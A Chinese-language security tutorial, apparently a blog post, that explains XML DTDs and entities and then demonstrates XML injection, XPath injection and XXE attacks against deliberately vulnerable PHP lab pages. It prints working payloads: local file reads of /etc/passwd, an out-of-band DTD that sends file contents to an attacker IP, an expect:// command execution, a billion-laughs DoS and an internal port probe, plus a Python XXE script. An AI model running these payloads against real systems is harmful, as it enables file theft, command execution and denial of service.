<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [&lt;!--定义此文档是 note 类型的文档--&gt;</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note元素有四个元素--&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Y0u&lt;/to&gt;</span><br><span class="line">&lt;from&gt;@re&lt;/from&gt;</span><br><span class="line">&lt;head&gt;v3ry&lt;/head&gt;</span><br><span class="line">&lt;body&gt;g00d!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
<p>其中元素类型</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PCDATA类型：被解析的字符串数据，即会被解析器解析的文本</span><br><span class="line"></span><br><span class="line">CDATA类型：字符数据，即不会被解析器解析的文本</span><br><span class="line"></span><br><span class="line">EMPTY类型：表示空元素</span><br><span class="line"></span><br><span class="line">ANT类型：表示带有任何内容的元素</span><br><span class="line"></span><br><span class="line">(子元素名称1,子元素名称2,......)类型：表示带有子元素（序列）的元素</span><br></pre></td></tr></table></figure>


<p>外部DTD</p>
<ol>
<li><p>引入外部的dtd文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 SYSTEM &quot;dtd路径&quot;&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>使用外部的dtd文件（网络上的dtd文件）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 PUBLIC &quot;DTD名称&quot; &quot;DTD文档的url&quot;&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>使用外部DTD时，通过如下语法引入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root-element SYSTEM &quot;filename&quot;&gt;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>示例代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root-element SYSTEM &quot;test.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Y0u&lt;/to&gt;</span><br><span class="line">&lt;from&gt;@re&lt;/from&gt;</span><br><span class="line">&lt;head&gt;v3ry&lt;/head&gt;</span><br><span class="line">&lt;body&gt;g00d!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>



<h3 id="实体引用"><a href="#实体引用" class="headerlink" title="实体引用"></a>实体引用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">实体引用是当XML元素以形如&lt;tag&gt;foo&lt;/tag&gt;的标签开始和结束，且元素的内部如果存在特殊的字符，会用实体引用来替换特殊字符，而实体引用可以起到宏定义和文件包含的效果</span><br></pre></td></tr></table></figure>
<p>其中预定义的五个实体引用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">”&lt;“相当于”$lt“</span><br><span class="line"></span><br><span class="line">”&gt;“相当于”$gt“</span><br><span class="line"></span><br><span class="line">”&amp;“相当于”$amp“</span><br><span class="line"></span><br><span class="line">”&#x27;“相当于”$apos“</span><br><span class="line"></span><br><span class="line">”&quot;“相当于”$quot“</span><br></pre></td></tr></table></figure>

<h4 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h4><p>实体是用于定义引用普通文本或特殊字符的快捷方式，而实体引用是对实体的引用</p>
<p>实体按参数分类，分为一般实体和参数实体</p>
<p>一般实体</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称“实体内容&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>引用一般实体方法为：&amp;实体名称</p>
<p>参数实体</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY %实体名称 &quot;实体内容&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>引用参数实体的方法为：%实体名称</p>
<p>按照实体使用类型分类，又分为内部声明实体和引用外部实体</p>
<p>内部实体</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 “实体的值”&gt;</span><br></pre></td></tr></table></figure>
<p>示例代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY writer &quot;Dawn&quot;&gt;</span><br><span class="line">    &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;test&gt;&amp;writer;©right;&lt;/test&gt;</span><br></pre></td></tr></table></figure>

<p>外部实体<br>用来引入外部资源，有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br><span class="line">或者</span><br><span class="line">&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>示例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;author&gt;&amp;file;©right;&lt;/author&gt;</span><br></pre></td></tr></table></figure>
<p> 参数实体+外部实体</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>示例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">  &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">  %file;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
<p>其中%file(参数实体)在DTD中被引用，而&file;是在xmL文档中被引用</p>
<h3 id="DTD属性"><a href="#DTD属性" class="headerlink" title="DTD属性"></a>DTD属性</h3><p>属性声明语法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&gt;</span><br></pre></td></tr></table></figure>
<p>DTD实例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST payment Luckey CDATA &quot;Q&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>XML实例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;payment Luckey=&quot;Q&quot; /&gt;</span><br></pre></td></tr></table></figure>



<h2 id="XML注入"><a href="#XML注入" class="headerlink" title="XML注入"></a>XML注入</h2><p>XML是传输数据和存储数据的，是利用闭合标签来改写XML文件来实现的</p>
<h3 id="XML注入原理"><a href="#XML注入原理" class="headerlink" title="XML注入原理"></a>XML注入原理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XML是数据组织存储的数据结构方式，当用户输入数据时，由于输入的数据没有进行检测和过滤掉特殊字符，所以有可能会改变xmL的结构，插入新的功能，这样便会导致XML注入攻击</span><br></pre></td></tr></table></figure>
<h3 id="XML注入示例"><a href="#XML注入示例" class="headerlink" title="XML注入示例"></a>XML注入示例</h3><p>XML注入条件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 用户能够控制数据的输入</span><br><span class="line"></span><br><span class="line">2. 程序有拼凑的数据</span><br></pre></td></tr></table></figure>
<p>test.xml</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;manager&gt;</span><br><span class="line">    &lt;admin id=&quot;1&quot;&gt;</span><br><span class="line">    &lt;username&gt;admin&lt;/username&gt;</span><br><span class="line">    &lt;password&gt;admin&lt;/password&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/admin&gt;</span><br><span class="line">    &lt;admin id=&quot;2&quot;&gt;</span><br><span class="line">    &lt;username&gt;root&lt;/username&gt;</span><br><span class="line">    &lt;password&gt;root&lt;/password&gt;</span><br><span class="line">    &lt;/admin&gt;</span><br><span class="line">&lt;/manager&gt;</span><br></pre></td></tr></table></figure>
<p>当我们可以掌握password字段时，我们可以输入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root&lt;/password&gt;&lt;/admin&gt;&lt;admin id=&quot;3&quot;&gt;&lt;name&gt;hack&lt;/name&gt;&lt;password&gt;hacker</span><br></pre></td></tr></table></figure>
<p>可以对xml原来结构进行更改，加多了一个hack的用户和密码</p>
<p>修改后的xml</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;manager&gt;</span><br><span class="line">    &lt;admin id=&quot;1&quot;&gt;</span><br><span class="line">    &lt;name&gt;admin&lt;/name&gt;</span><br><span class="line">    &lt;password&gt;admin&lt;/password&gt;</span><br><span class="line">    &lt;/admin&gt;</span><br><span class="line">    &lt;admin id=&quot;2&quot;&gt;</span><br><span class="line">    &lt;username&gt;root&lt;/username&gt;</span><br><span class="line">    &lt;password&gt;root&lt;/password&gt;</span><br><span class="line">    &lt;/admin&gt;</span><br><span class="line">    &lt;admin id=&quot;3&quot;&gt;</span><br><span class="line">    &lt;name&gt;hack&lt;/name&gt;</span><br><span class="line">    &lt;password&gt;hacker&lt;/password&gt;</span><br><span class="line">    &lt;/admin&gt;</span><br><span class="line">&lt;/manager&gt;</span><br></pre></td></tr></table></figure>
<p>如果要想XML注入，需要知道</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 闭合标签</span><br><span class="line">2. 获取XML表的结构</span><br></pre></td></tr></table></figure>
<h2 id="Xpath注入"><a href="#Xpath注入" class="headerlink" title="Xpath注入"></a>Xpath注入</h2><p>Xpath注入攻击是利用Xpath解析器的松散输入和容错特性，能够在url、表单或其它信息上附带恶意的Xpath查询代码，以获取权限信息的访问并更改这些信息，它可以探究使用的XML时如何构造的</p>
<h3 id="Xpath注入攻击的原理和利用"><a href="#Xpath注入攻击的原理和利用" class="headerlink" title="Xpath注入攻击的原理和利用"></a>Xpath注入攻击的原理和利用</h3><p>Xpath注入攻击是通过构建特殊输入来作为参数传入到web应用程序中，并通过执行Xpath查询来获取想要的数据，而注入的对象是xmL文件，注入出现位置为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cookie、headers、request parameters/input</span><br></pre></td></tr></table></figure>
<p>Xpath是XML路径语言，用于配置文件的查找，数据库就是XML文件，我们是利用Xpath语法的web应用程序没有对输入的Xpath查询做严格的处理，致使存在Xpath注入漏洞</p>
<h4 id="Xpath直接注入"><a href="#Xpath直接注入" class="headerlink" title="Xpath直接注入"></a>Xpath直接注入</h4><p>搭建环境<br>test2.xml</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">    &lt;users&gt; </span><br><span class="line">        &lt;user&gt; </span><br><span class="line">            &lt;id&gt;1&lt;/id&gt;</span><br><span class="line">            &lt;username&gt;test1&lt;/username&gt;</span><br><span class="line">            &lt;password&gt;test1&lt;/password&gt;</span><br><span class="line">        &lt;/user&gt; </span><br><span class="line">        &lt;user&gt; </span><br><span class="line">            &lt;id&gt;2&lt;/id&gt;</span><br><span class="line">            &lt;username&gt;test2&lt;/username&gt;</span><br><span class="line">            &lt;password&gt;test2&lt;/password&gt;</span><br><span class="line">        &lt;/user&gt;</span><br><span class="line">    &lt;/users&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
<p>用于接收参数并进行XML查询的php文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$xml=simplexml_load_file(&#x27;test2.xml&#x27;);</span><br><span class="line">$name=$_GET[&#x27;name&#x27;];</span><br><span class="line">$pwd=$_GET[&#x27;pwd&#x27;];</span><br><span class="line">$query=&quot;/root/users/user[username/text()=&#x27;&quot;.$name.&quot;&#x27; and password/text()=&#x27;&quot;.$pwd.&quot;&#x27;]&quot;;</span><br><span class="line">echo $query;</span><br><span class="line">$result=$xml-&gt;xpath($query);</span><br><span class="line">if($result)&#123;</span><br><span class="line">    echo &#x27;&lt;h2&gt;Welcome&lt;/h2&gt;&#x27;;</span><br><span class="line">    foreach($result as $key=&gt;$value)&#123;</span><br><span class="line">        echo &#x27;&lt;br /&gt;ID:&#x27;.$value-&gt;id;</span><br><span class="line">        echo &#x27;&lt;br /&gt;Username:&#x27;.$value-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>simplexml_load_file()</p>
<p>````<br>返回类SimpleXMLElement的一个对象，该对象的属性包含XML文档的数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Xpath查询语句为</span><br></pre></td></tr></table></figure>
<p>/root/users/user[username/text()=’’and password/text()=’’]</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击者可以利用逻辑漏洞，构造</span><br></pre></td></tr></table></figure>
<p>?name=’or 1=1 ‘’=’&amp;pwd=1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">这样逻辑上会使查询一直为true，从而查到所有数据信息</span><br><span class="line"></span><br><span class="line">#### Xpath盲注</span><br><span class="line"></span><br><span class="line">盲注根节点</span><br><span class="line"></span><br><span class="line">利用count(/*)判断根下节点</span><br></pre></td></tr></table></figure>
<p>?name=’ or count(/*) = 1 or ‘1’ = ‘2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">有返回证明存在一个根节点</span><br><span class="line"></span><br><span class="line">利用subsring来分割根节点的每个字符</span><br></pre></td></tr></table></figure>
<p>?name=’ or substring(name(/*[position() = 1]),1,1)=’r’ or ‘1’=’2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">得到根节点为root</span><br><span class="line"></span><br><span class="line">判断root下一级节点数</span><br></pre></td></tr></table></figure>
<p>?name=’ or count(/root/*) = 1 or ‘1’ = ‘2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">返回结果证明存在root下一个节点</span><br><span class="line"></span><br><span class="line">猜解root下一级节点</span><br></pre></td></tr></table></figure>
<p>?name=’ or substring(name(/root/*[position() = 1]),1,1)=’u’ or ‘1’=’2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## XML外部实体注入(XXE漏洞)</span><br><span class="line"></span><br><span class="line">XXE漏洞发生在应用程序解析XML输入时，没有禁止对外部实体的加载，导致加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站及发起dos攻击</span><br><span class="line"></span><br><span class="line">而xxe漏洞的触发点在于没有对上传xml文件进行过滤，导致可以上传恶意xml文件</span><br><span class="line">注意：</span><br></pre></td></tr></table></figure>
<p>解析xml在php库libxml，libxml&gt;=2.9.0的版本中没有XXE漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">### xxe本地搭建</span><br><span class="line"></span><br><span class="line">xxe.php</span><br></pre></td></tr></table></figure>
<?php
$xmlfile=file_get_contents('php://input');
$dom=new DOMDocument();
$dom->loadXML($xmlfile);
$xml=simplexml_import_dom($dom);
$xxe=$xml->xxe;
$str="$xxe \n";
echo $str;
?>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">其中函数的作用</span><br></pre></td></tr></table></figure>
<p>file_get_contents——————————获取客户端输入内容</p>
<p>new DOMDocument()————————初始化XML解析器</p>
<p>loadXML($xmlfile)—————————-加载客户端输入的XML内容</p>
<p>simplexml_import_dom($dom)—————获取XML文档节点，如果成功则返回SimpleXMLElement对象，如果失败则返回FALSE。</p>
<p>$xml-&gt;xxe————————————-获取SimpleXMLElement对象中的节点XXE，然后输出XXE内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">上传的xml文件</span><br></pre></td></tr></table></figure>
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE a [
<!ENTITY file SYSTEM "file:///d://qwzf.txt">
<p>]&gt;<br><xml><br><xxe>&file;</xxe><br></xml></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">其中&amp;file;为qwzf.txt的内容</span><br><span class="line"></span><br><span class="line">#### xxe常见利用</span><br><span class="line"></span><br><span class="line">##### 读取任意文件</span><br><span class="line"></span><br><span class="line">有回显</span><br><span class="line"></span><br><span class="line">有xxe漏洞的文件</span><br></pre></td></tr></table></figure>
<?php
$xml = simplexml_load_string($_REQUEST['xml']);
print_r($xml);//注释掉该语句即为无回显的情况
?>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后通过get提交上传xml文件，即构造payload</span><br></pre></td></tr></table></figure>
<p>?xml=<?xml version="1.0" encoding="utf-8"?><br><!DOCTYPE xxe [
<!ELEMENT name ANY ><br><!ENTITY file SYSTEM "file:///d://qwzf.txt" ><br>]&gt;<br><root><br><name>&file;</name><br></root></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">最好将xml转换为url格式，通过构造外部实体payload，在xml文件中&amp;file;变为qwzf.txt文件内容</span><br><span class="line"></span><br><span class="line">无回显</span><br><span class="line"></span><br><span class="line">如果没有回显的话，可以先在远程服务器部署evil.dtd</span><br></pre></td></tr></table></figure>
<!ENTITY % payload "<!ENTITY % send SYSTEM 'http://192.168.201.128/?content=%file;'><p>“&gt; %payload;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">然后构造paload</span><br></pre></td></tr></table></figure>
<?xml version="1.0"?>
<!DOCTYPE test[
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=D:/qwzf.txt">
<!ENTITY % dtd SYSTEM "http://192.168.201.128/evil.dtd">
<p>%dtd;<br>%send;<br>]&gt;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">被攻击的服务器收到后会调用%data，致使调用外部的dtd文件，然后%file会被调用，变为qwzf.txt的内容，然后调用%send;将读到的数据返还给攻击服务器</span><br><span class="line"></span><br><span class="line">##### 使用恶意脚本</span><br><span class="line"></span><br><span class="line">环境搭建</span><br><span class="line">xxe2.php</span><br></pre></td></tr></table></figure>
<?php
$data = file_get_contents('php://input');
$xml = simplexml_load_string($data);
echo $xml->name;
?>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">而后使用脚本</span><br></pre></td></tr></table></figure>
<p>#!/usr/bin/python</p>
<h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="-- coding:utf-8 --"></a>-<em>- coding:utf-8 -</em>-</h1><p>import urllib2</p>
<p>if <strong>name</strong> == ‘<strong>main</strong>‘:</p>
<pre><code>print u&#39;输入要访问的地址，如http://127.0.0.1/xml/xxe2.php&#39;
url = raw_input()
count=1
while count==1:
    print u&#39;输入要读取的文件，如file:///etc/passwd&#39;
    payload = raw_input()
    headers = &#123;&#39;Content-type&#39;: &#39;text/xml&#39;&#125;
    xml = &#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;&#39; + payload + &#39;&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;&#39;
    req = urllib2.Request(url = url,headers = headers, data = xml)
    res_data = urllib2.urlopen(req)
    res = res_data.read()
    print res
</code></pre>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### 执行系统命令</span><br><span class="line"></span><br><span class="line">可以使用expect扩展在php环境里执行命令</span><br></pre></td></tr></table></figure>
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "expect://id" ><p>]&gt;<br><root><br><name>&xxe;</name><br></root></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### 拒绝服务攻击（dos)</span><br></pre></td></tr></table></figure>
<?xml version="1.0"?>
   <!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
<p>]&gt;<br><lolz>&lol9;</lolz></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">原理：因为lol要引用10次，而lol2有10个lol，所以要引用10的10次方次，以此类推，lol9要引用许多次，所以造成攻击</span><br><span class="line"></span><br><span class="line">##### 探测内网端口</span><br></pre></td></tr></table></figure>
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "http://127.0.0.1:80" ><p>]&gt;<br><root><br><name>&xxe;</name><br></root></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">报错，端口未开放；不报错，端口开放</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##### 攻击内网网站</span><br></pre></td></tr></table></figure>
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
<!ELEMENT name ANY >
